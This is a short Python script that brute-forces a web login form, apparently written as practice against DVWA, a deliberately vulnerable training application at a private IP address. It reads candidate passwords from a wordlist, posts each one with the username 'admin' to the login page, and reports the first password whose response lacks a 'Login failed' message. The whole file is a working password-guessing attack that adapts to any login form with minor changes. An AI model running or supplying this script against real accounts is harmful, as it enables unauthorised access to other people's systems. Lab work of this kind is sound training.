#!/usr/bin/python

import requests

target_url = "http://192.168.0.10/dvwa/login.php"
data_dict = {"username": "admin", "password": "123", "Login": "submit"}

# openthe wordlist file
with open("wordlist.txt", "r") as wordlist_file:
    # iterate through the password file
    for line in wordlist_file:
        # create a list from the password file
        word = line.strip()
        data_dict["password"] = word
        # make a web request
        response = requests.post(target_url, data=data_dict)
        # check if "Login failed" is in response, if not, print the match
        if b"Login failed" not in response.content:
            print("[+] Got the password: " + word)
            exit()

print("[+] End of file!.")
